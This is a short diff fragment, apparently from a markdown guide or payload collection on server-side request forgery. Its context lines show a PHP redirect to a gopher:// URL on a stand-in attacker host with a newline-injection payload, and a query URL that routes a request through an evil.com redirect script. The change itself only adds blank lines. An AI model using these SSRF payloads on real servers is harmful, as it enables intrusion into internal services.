@@ -20,3 +20,5 @@ header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
 Now query it.
 https://example.com/?q=http://evil.com/redirect.php.
 ```
+
+
